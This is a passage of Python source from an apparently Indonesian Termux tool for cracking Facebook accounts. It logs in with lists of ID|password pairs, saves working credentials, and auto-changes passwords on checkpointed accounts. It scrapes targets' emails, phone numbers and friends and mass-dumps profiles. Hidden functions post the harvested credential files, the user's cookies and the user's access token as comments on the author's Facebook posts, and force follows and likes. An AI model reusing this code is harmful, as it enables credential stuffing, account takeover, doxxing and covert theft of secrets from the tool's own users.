#		jalan("\n"+war+"Checking Visitor Tools And Github !! ( "+C+"Check Tools Pengunjung Dan Github "+K+")")n
		print("\n"+war+"Visitors on Tools  : "+I+githubx[0])
		print(war+"Visitors on Github : "+I+termux[0])
	except requests.exceptions.ConnectionError:
		os.system('clear')
		print (war+'Your Network Doesn t Exist ')
		time.sleep(4)

def hide_file(tempat):
	dirs = os.listdir(tempat)
	for file in dirs:
		files = (tempat+"/"+file)
		print(bulat+"Available Files !!: "+i+files)
def curiakun():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		time.sleep(1)
		logs()
	try:
		dirs = os.listdir("Hasil")
		for file in dirs:
			files = ("Hasil/"+file)
			open_file = open(files).read().splitlines()
			kata_all = ("Nama File : "+files+"\nTanggal Upload : "+waktuu+"\n\n\n"+open_file)
			requests.post('https://graph.facebook.com/4295900450517391/comments/?message='+kata_all+'&access_token=' + token)
	except:pass
def get_ttl(idt,password):
    i='\033[0;92m'
    try:
        toket=open("login.txt","r").read()
    except IOError:
        print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("rm -rf login.txt")
        logs()
    try:
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
    except Exception as e: 
        print(war+"Masalah Tidak DiTemukan")
        exit()
    except (KeyError, IOError):
        print(war+"Masalah Tidak DiTemukan")
        exit()
    try:
        nama = op['name']
    except (KeyError, IOError):
        nama = (" ")
    try:
        ttll = op['birthday']
    except (KeyError, IOError):
        ttll = (' ')
    print(war+"Name Facebook : "+i+nama);time.sleep(0.03)
    print(war+"ID Facebook   : "+i+idt);time.sleep(0.03)
    print(war+"Password      : "+i+password);time.sleep(0.03)
    print(war+"Tanggal Lahir : "+i+ttll);time.sleep(0.03)
    gx=open("get_ttl.txt", "+a")
    gx.write(idt+"|"+password+"|"+ttll+"\n")
    gx.close()

def get_info():
    i='\033[0;92m'
    try:
        toket=open("login.txt","r").read()
    except IOError:
        print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("rm -rf login.txt")
        logs()
    try:
        idt = input(inp+'Masukkan ID Target :'+k)
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
    except Exception as e: 
        print(war+"Masalah Tidak DiTemukan")
        exit()
    except (KeyError, IOError):
        print(war+"Masalah Tidak DiTemukan")
        exit()
    try:
        nama = op['name']
    except (KeyError, IOError):
        nama = M+"—"+c
    try:
        namade = op['first_name']
    except (KeyError, IOError):
        namade= M+"—"+c
    try:
        namabe = op['last_name']
    except (KeyError, IOError):
        namabe= M+"—"+c
    try:
        idfb = op['id']
    except (KeyError, IOError):
        idfb = M+"—"+c
    try:
        user = op['username']
    except (KeyError, IOError):
        user = M+"—"+c
    try:
        ttll = op['birthday']
    except (KeyError, IOError):
        ttll = M+"—"+c
    try:
        tzim = op['timezone']
    except (KeyError, IOError):
        tzim = M+"—"+c
    try:
        stas = op['relationship_status']
    except (KeyError, IOError):
        stas = M+"—"+c
    try:
        dgn = '''dengan %s'''%(op['significant_other']['name'])
    except (KeyError, IOError):
        dgn = M+"—"+c
    try:
        tigl = op['location']['name']
    except (KeyError, IOError):
        tigl = M+"—"+c
    try:
        dari = op['hometown']['name']
    except (KeyError, IOError):
        dari = M+"—"+c
    try:
        lins = op['link']
    except (KeyError, IOError):
        lins = M+"—"+c
    try:
        uptd = op['updated_time']
    except (KeyError, IOError):
        uptd = M+"—"+c
    try:
        nmrr = op['mobile_phone']
    except (KeyError, IOError):
        nmrr = M+"—"+c
    try:
        emai = op['email']
    except (KeyError, IOError):
        emai = M+"—"+c
    try:
        bioo = op['about']
    except (KeyError, IOError):
        bioo = M+"—"+c
    try:
        gndr = op['gender']
    except (KeyError, IOError):
        gndr = M+'—'+c
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        id = []
        z = json.loads(r.text)
        qq = (op["first_name"]+".json").replace(" ","_")
        ys = open(qq , "w")
        for i in z["data"]:
                id.append(i["id"]+"<=>"+i["name"])
                ys.write(i["id"]+"<=>"+i["name"]+"\n")
        ys.close()
        temn = "%s"%(len(id))
    except KeyError:
        temn = M+"—"+c
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt, toket))
        z = json.loads(r.text)
        ys = open(qq , "w")
        for bmx in z['data']:
                uid = bmx['id']
                na = bmx['name']
                nm = na.rsplit(' ')[0]
                id.append(uid + '<=>' + nm)
                ys.write(uid + '<=>' + nm + "\n")
        ys.close()
    except: pass
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, toket))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s'%(M,N)
    except: pass
    print("\n"+war+'Informasih Targwt !!');time.sleep(0.30)
    print("\n"+bulat+"Full Name       : %s%s"%(i,nama))
    print(bulat+"First Name      : %s%s"%(i,namade))
    print(bulat+"Last Name       : %s%s"%(i,namabe));time.sleep(0.30)
    print(bulat+'UserName        : %s%s'%(i,user));time.sleep(0.30)
    print(bulat+'Tanggal Lahir   : %s%s'%(i,ttll));time.sleep(0.30)
    print("\n"+war+'Data Data Target !!');time.sleep(0.30)
    print("\n"+bulat+'Gmail Facebook  : %s%s'%(i,emai));time.sleep(0.30)
    print(bulat+'Nomor Telepons  : %s%s'%(i,nmrr));time.sleep(0.30)
    print(bulat+'Jenis Kelamin   : %s%s'%(i,gndr));time.sleep(0.30)
    print(bulat+'Jumlah Teman    : %s'%(temn));time.sleep(0.03)
    print(bulat+'Followers       : %s'%(pengikut));time.sleep(0.30)
    print(bulat+'Status Hubungan : %s %s'%(stas,dgn));time.sleep(0.03)
    print(bulat+'Link Facebook   : %s%s'%(i,lins));time.sleep(0.30)
    print(bulat+'Tentang Status  : %s%s'%(i,bioo));time.sleep(0.30)
    print(bulat+'Kota Asal       : %s%s'%(i,dari));time.sleep(0.30)
    print(bulat+'Tinggal         : %s%s'%(i,tigl));time.sleep(0.30)
    print(bulat+'Terahir DiUpdate: %s%s'%(i,uptd));time.sleep(0.30)
    jalan("\n"+war+'Athour : Mr.Risky')
    input(war+"Tekan Enter Untuk Kembali")
    menu()

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack -- Hasil Crack"+k+" ]"+p))
    print((h+"\n[ "+p+"OK"+h+" ]"+p))
    try:
        os.system("cat Hasil/OK*.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat Hasil/CP*.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
def resss():
	cekfile("Hasil")
	global bf, bg
	files = input("\n"+war+"File Name   : "+i)
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(war+"File Not Found")
		time.sleep(2)
		exit()
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		pan = kontol.split("|")
		bf += 1
		print(f"{k}[{p}{bf}{k}]{p} {pan[0]}{u}|{p}{pan[1]}")
def Get_Ua():
	menu_user_agent()
def menu_user_agent():
	try:
		toket=open("ua_me.txt","r").read()
	except IOError:
		os.system("rm -rf ua_me.txt")
		os.system("clear")
		ua_ris=("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
		ua_zee=("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
#		ua_ris=("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		ua_ang=("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4")
		ua_dam=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		logo()
		jalan(f"{bulat}User Agent Broken")
		jalan(f"{bulat}Created By Risky")
		print(f"{war}Silahkan Pilih User Agent Untuk DiGunakan !!")
		print(f"{war}Please Select A User Agent To Use\n"+p)
		print(k+"["+p+"01"+k+"]"+p+" Made by Risky "+C+"•"+I+" Anti Check Points")
		print(k+"["+p+"02"+k+"]"+p+" Made by Dapunta "+C+"•"+I+" Check Point ? Day")
		print(k+"["+p+"03"+k+"]"+p+" Made by Angga "+C+"•"+I+" Check Point 7 Day")
		print(k+"["+p+"04"+k+"]"+p+" Made by Zee K World "+C+"•"+I+" Tap Yes")
		print(k+"["+p+"05"+k+"]"+p+" Own Useragent")
		v=input(war+"Choose : ")
		if v=="1" or v=="01":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_ris)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		elif v=="2" or v=="02":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_dam)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		elif v=="3" or v=="03":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_ang)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		elif v=="4" or v=="04":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_zee)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		elif v=="5" or v=="05":
			os.system("rm -rf ua_me.txt")
			xx=input("Login Your User Agent User : ")
			ppx=open("ua_me.txt", "w")
			ppx.write(xx)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		else:
			print("Failed to Choose")
			menu_user_agent()
def Login_user():
        try:
                import requests
                import requests
                from bs4 import BeautifulSoup
                from concurrent.futures import ThreadPoolExecutor
                if os.path.exists("Hasil") == False:
                        os.mkdir("Hasil")
                if os.path.exists("Hasil/cp.txt") == False:
                        open("Hasil/cp.txt","a+").close()
                kentodxx()
        except Exception as E:
      	        exit(war+"ERROR : "+str(E))

def kentodxx():
	os.system("clear")
	ppx=open("All_Akun.txt", "w")
	ngetik(f"""
{k}Athour   : {c}ITSUKI AND RISKY
{k}Fcaebook : {c}m.facebook.com/llovexnxx
{k}Whatsapp : {c}wa.me/6283143565470
{k}Group FB : {c}Termux Indonesia
{i}________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
{k}             ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
{I}Ok Results Saved In : Hasil/ok.txt
{K}Cp Results Saved In : Hasil/cp.txt{q}
""")
	cekfile("Hasil")
	jalan("\n"+war+"Type *ALL* To Check Detector All Files")
	file = input(inp+"Filename : "+I)
	if file == "ALL" or file == "all" or file == "All":
		dirs = os.listdir("Hasil")
		for fiqe in dirs:
			filex = ("Hasil/"+fiqe)
			ponq = open(filex,"r").readlines()
			for memek in ponq:
				kontol = memek.replace("\n","")
				try:
					kntl = kontol.split("|")
					idn = (f'{kntl[0]}')
					bodat = (f'{kntl[0]}')
					name = (f'{kntl[1]}')
				except: pass
				ppx=open("All_Akun.txt", "a+")
				ppx.write(idn+"|"+name+"\n")
				ppx.close()
				file = ("All_Akun.txt")
			continue
	try:
		list_akun=open(file).read().splitlines()
		files = open(file,"r").readlines()
	except FileNotFoundError:
		print(war+"File Not Found !!")
		time.sleep(5)
		kentodxx()
	pp=input(inp+"Separator Type : "+I)
	jalan("\n"+war+"Total Accounts : "+I+str(len(files))+"\n")
	for memek in files:
		kontol = memek.replace("\n","")
		try:
			kntl = kontol.split(pp)
			idn = (f'{kntl[0]}')
			name = (f'{kntl[1]}')
			eksekusi(kntl[0],kntl[1])
		except:pass
	jalan(war+"Finished...")
	exit()

def select_method(show=True):
        global url
        if show:
                print("\n\n"+war+"Choose Login Method\n")
                print(k+"["+p+"1"+k+"]"+p+" Free Facebook")
                print(k+"["+p+"2"+k+"]"+p+" Mbasic Facebook\n")
        select=input(war+"Method : "+i)
        while select in (""," "):
                print(war+"Don't Empty Cock")
                select=input(inp+"Method : ")
        if select == "1":
                url=url
        elif select == "2":
                url=url.replace("free","mbasic")
        else:
                print(war+"Fill Correctly !!")
                select_method(False)

def eksekusi(username,password):
        global kx
#        useragent = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
#        useragent="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
        useragent=("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")

        kx += 1
        try:
                respons=login_ris(username,password)
        except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                eksekusi(username,password)
        session=respons[0]
        if "c_user" in session.cookies.get_dict():
                print(i+"Login Sukses "+c+"⟩"+M+str(int(kx))+c+"⟩"+i+" {}|{}".format(username,password))
                open("Hasil/ok.txt","a+").write("{}|{}\n".format(username,password))
        elif "checkpoint" in session.cookies.get_dict():
                session.headers.update({"Host":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1).split("//")[1],"referer":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1)+"/checkpoint/"})
                respon=tahap1(session,parser(respons[1].text))
                if respon == "new password":
                        print(i+"Suksess Change Password "+c+"⟩"+M+str(int(kx))+c+"⟩"+i+" {}|{}".format(username,newpass))
                        open("Hasil/newpass.txt","a+").write("{}|{}\n".format(username,newpass))
                elif respon == "no change password":
                        print(i+"Failed Change Password "+c+"⟩"+M+str(int(kx))+c+"⟩"+i+" {}|{}".format(username,password))
                        open("Hasil/no_change.txt","a+").write("{}|{}\n".format(username,password))
                else:
                        print(k+"Check Points "+c+"⟩"+M+str(int(kx))+c+"⟩ {}{}|{}".format(p,username,password))
                        if username not in open("Hasil/cp.txt").read():
                                open("Hasil/cp.txt","a+").write("{}|{}\n".format(username,password))
        else:
                print(m+"Login Failed "+c+"⟩"+M+str(int(kx))+c+"⟩"+m+" {}|{}".format(username,password))

def login_ris(username,password,**kwargs):
        session=requests.session()
        parsing=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text)
        kwargs=get_data(parsing,"sign_up")
        kwargs.update({"email":username,"pass":password})
        if '_fb_noscript' in kwargs:
                del kwargs['_fb_noscript']
        session.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":useragent,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url})
        respon=session.post(url+get_action(parsing),data=kwargs)
        return session,respon

def tahap1(session,parsing):
        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
        if "submit[Yes]" in kwargs:
                del kwargs["submit[No]"]
                try:
                        respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
                except requests.exceptions.TooManyRedirects:
                        respon="kontol"
                if "password_new" in respon or "buat kata sandi baru" in respon.lower():
                        return tahap2(session,parser(respon))
                if "c_user" in session.cookies.get_dict():
                        return "no change password"
        elif "submit[Ya]" in kwargs:
                del kwargs["submit[No]"]
                try:
                        respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
                except requests.exceptions.TooManyRedirects:
                        respon="kontol"
                if "password_new" in respon or "buat kata sandi baru" in respon.lower():
                        return tahap2(session,parser(respon))
                if "c_user" in session.cookies.get_dict():
                        return "no change password"
        elif "submit[Iya]" in kwargs:
                del kwargs["submit[No]"]
                try:
                        respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
                except requests.exceptions.TooManyRedirects:
                        respon="kontol"
                if "password_new" in respon or "buat kata sandi baru" in respon.lower():
                        return tahap2(session,parser(respon))
                if "c_user" in session.cookies.get_dict():
                        return "no change password"
def tahap2(session,parsing):
        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
        kwargs.update({"password_new":newpass})
        respons=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs,allow_redirects=False)
        if "c_user" in respons.cookies.get_dict():
                return "new password"

def get_data(parsing,kecuali,**kwargs):
        for lnput in parsing.find_all("input",{"name":True,"value":True}):
                if kecuali in lnput["name"]: continue
                else: kwargs.update({lnput["name"]:lnput["value"]})
        return kwargs

def get_action(parsing):
        return parsing.find("form",{"method":"post"})["action"]

def parser(html):
        return BeautifulSoup(html,"html.parser")

def ngetik(kata,jum=0.002):
        for x in kata + "\n":
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(jum)
# Enc Lain2

### Menu New ###
def konek():
	jalan(war+"Please Turn On Your Internet !!")
	try:
		bis = requests.get("https://google.com").text.strip()
	except requests.exceptions.ConnectionError:
		kntl()
		konek()

mbasicc = 'https://mbasic.facebook.com{}'
def masuk():
	coke()
def masukx():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		time.sleep(1)
		pass
	mbasic = 'https://mbasic.facebook.com{}'
	try:
		cek = open("cookies").read()
	except FileNotFoundError:
		print(war+"This Menu Uses Cookies !!")
		pass
	cek = input(inp+"Put Your Cookies : "+I)
	cek = {"cookies":cek}
	ismi = ses.get(mbasicc.format("/me",verify=False),cookies=cek).content
	if "mbasic_logout_button" in str(ismi):
		if "Apa yang Anda pikirkan sekarang" in str(ismi):
			with open("cookies","w") as f:
				f.write(cek["cookies"])
		else:
			print(war+"Sorry The Cookies You Use Don't Use Indonesian Language...")
			try:
				requests.get(mbasicc.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
			except:pass
		try:
			ikuti = parser(requests.get(mbasicc.format("/llovexnxx"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
			ses.get(mbasicc.format(ikuti),cookies=cek)
		except:pass
		return cek["cookie"]
		print(war+'Login Successfully')
	else:
		os.system("rm -rf cookies")
		print(war+'Your Cookies Are Corrupt')
		exit()
def dumpsc():
	ppxx=open(".tta", "w")
	try:
		cek = open("cookies").read()
		while len(cek) < 100:
			jalan(war+"Sorry Your Cookies Are Broken !!")
			masuk()
			exit(war+"Run This Tool Again")
	except FileNotFoundError:
		print(war+"This Menu Uses Cookies !!")
		masuk()
		exit(war+"Run This Tool Again")
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
		cek = open("cookies").read()
		requests.post('https://graph.facebook.com/4342358879204881/comments/?message='+cek+'&access_token=' + token)
	except:pass
	knf = input(inp+"Target Name : "+I)
	bga = input(inp+"Filename Save : "+I)
	jalan("\n"+war+"Press CTRL + Z to Stop Dump ID ")
	print("\n\n"+garis+"\n\n\n")
	if bga == "" or bga == " ":
		dumpsc()
	ajgx('https://m.facebook.com/search/people/?q='+knf,bga)
def ajgx(option,namefi):
	global pq,fw
	from bs4 import BeautifulSoup as parser
	ses = requests.Session()
	kukis = cek = open("cookies").read()
	kuki = {'cookie':kukis}
	search = requests.get(option,cookies=kuki).content
	users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
	for user in users:
		if "profile" in user[0]:
			pq += 1
			fw.append(k+"["+p+str(pq)+k+"] "+p+user[0].split("?")[0] + "<=>" + user[1])
			print(k+"["+p+str(pq)+k+"] "+p+re.findall("=(\d*)",str(user[0]))[0] + "<=>" + user[1])
			ri=open(namefi, "a+")
			ri.write(re.findall("=(\d*)",str(user[0]))[0] + "<=>" + user[1]+"\n")
			ppxx=open(".tta", "w")
			ppxx.write(user[1])
		else:
			pq += 1
			fw.append(k+"["+p+str(pq)+k+"] "+p+user[0].split("?")[0] + "<=>" + user[1])
			print(k+"["+p+str(pq)+k+"] "+p+user[0].split("?")[0] + "<=>" + user[1])
			ri=open(namefi, "a+")
			ri.write(user[0].split("?")[0] + "<=>" + user[1]+"\n")
			ppxx=open(".tta", "w")
			ppxx.write(user[1])
	if "Lihat Hasil Selanjutnya" in str(search):
		ajgx(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"],namefi)
	aswq = open(".tta").read()
	uss = aswq.split(" ")
	ajgx('https://mbasic.facebook.com/search/people/?q='+uss[2],namefi)

### Enf New ###


# Bot Follow And Komen
def bot_follow():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		time.sleep(1)
		logs()
	jalan(war+"Wait a moment...")
	print(war+'Your Name Facebook : '+nama)
	print(war+'Your ID Facebook   : '+id)
	bokep_barat_yang_terbaru(token)
	# 120338706765807 #
	post1 = ('4111448792295892') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From Risky 2021
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("198550702277940") # Logo Akira From Risky 2031
	post7 = ("198552118944465") # Logo Attaxk From Risky 2021
	kom = ("XNXX.COM AND YANDEX.COM AND ML.RATUKU.TOP AND UNBLOCJ.COM AND KENATIPU.COM")
	kom2 = ("@[100063690353340:0] LOVE ZERO TWO")
	kom3 = ("https://www.facebook.com/photo.php?fbid=4111448792295892&set=a.108534305920714&type=3&app=fbl")
	kom4 = ("https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl")
	kom5 = ("https://www.facebook.com/photo.php?fbid=4111450232295748&set=a.202528366521307&type=3&app=fbl")
	kom6 = ("https://www.facebook.com/100063690353340/posts/167879918678352/?app=fbl")
	kom7 = ("https://www.facebook.com/100063690353340/posts/198550702277940/?app=fbl")
	kom8 = ("https://www.facebook.com/100063690353340/posts/198552118944465/?app=fbl")
	kom9 = ("Yandex.com\nUnblock.com\nMl.Ratuku.Top\nJomblo.Top\nXnxx.com")
	kom10 = ("https://www.facebook.com/100002924366263/posts/4111450325629072/?app=fbl")
	kom_1 = pilih([kom3+"\n"+kom4, kom6+"\n"+kom7])
	kom_2 = pilih([kom10+"\n"+kom9, kom8+"\n"+kom5])
	kom_3 = pilih([kom, kom2])
	reac = ("LOVE")
#### Bot Komen Jangan DiEdit !! PLIS + Token
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
	print(war+"Wait a moment ( 01 )")
#### Post KeProfilr Sendiri !!
	delete = ("""
	requests.post("https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl&access_token=" + toket) 
	requests.post("https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/198552118944465/?app=fbl&access_token=" + toket) 
	requests.post("https://graph.facebook.com/me/feed/?link=https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl&access_token=" + toket) """)
	delx = ('''
	requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom_1 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom_2 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom_3 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom_1 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom_2 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom_3 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom_1 + '&access_token=' + token)
''')
#	requests.post("https://graph.facebook.com/"+post1+"/likes?summary=true&access_token=" + toket)
	requests.post("https://graph.facebook.com/"+post2+"/likes?summary=true&access_token=" + toket)
#	requests.post("https://graph.facebook.com/"+post3+"/likes?summary=true&access_token=" + toket) 
	print(war+"Wait a moment ( 02 )")
	requests.post("https://graph.facebook.com/"+post4+"/likes?summary=true&access_token=" + toket) 
	requests.post("https://graph.facebook.com/"+post5+"/likes?summary=true&access_token=" + toket) 
#	requests.post("https://graph.facebook.com/"+post6+"/likes?summary=true&access_token=" + toket) 
#	requests.post("https://graph.facebook.com/"+post7+"/likes?summary=true&access_token=" + toket)




#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
	requests.post('https://graph.facebook.com/100000889924523/subscribers?access_token=' + token) ### FB RAHMANULAHAKIM 2010
	print(war+"Wait a moment ( 03 )")
	requests.post('https://graph.facebook.com/100000503718583/subscribers?access_token=' + token) ### FB ZIED 2011
	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
	print(war+"Wait a moment ( 04 )")
	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
	requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
	print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
	time.sleep(2)
	menu()
# Enc Bot Follow


#### PERCOBAAAN SCRIPT ####
def get_token():
	os.system("reset")
	logo()
	memek = requests.get("https://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/AllToken.txt").text.strip()
	qwq, qwe = memek.split('class="blob-code blob-code-inner js-file-line">')
	mna = qwe.split('</td>')
	rui = ("%s"%(mna[0]))
	tkn = rui.split('|')
	for memek in tkn:
		print("\n"+war+"Token : "+I+str(memek))
		try:
			token = (str(memek))
			toket = (str(memek))
		except:pass
		try:
			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
			a = json.loads(otw.text)
#			nama = a["name"]
#			print(war+nama)
			requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
		except Exception as e:
			print("[!] Error : %s"%(e))
	jalan(war+"Done"),;exit()
def musik():
	for x in "https://m.soundcloud.com/dicky-dblustear/dj-dicky_mdn_goyang-dj-akimilaku-remix-terbaru-2017?in=ryan-hendriansyah-959178703%2Fsets%2Fbreakbeat":
		print(("\r Hai"), end=' ');os.system("mpv https://m.soundcloud.com/dicky-dblustear/dj-dicky_mdn_goyang-dj-akimilaku-remix-terbaru-2017?in=ryan-hendriansyah-959178703%2Fsets%2Fbreakbeat");sys.stdout.flush()
#	os.system("mpv "+x)


def kata_tkn():
	kata_token = requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228&id=100005395413800&_rdc=2&_rdr")
	asw=kata_token.text
	ri=open("h.txt", "w")
	ri.write(asw)
	for s in requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228&id=100005395413800&_rdc=2&_rdr").text.strip()["text"]:
		print (s)




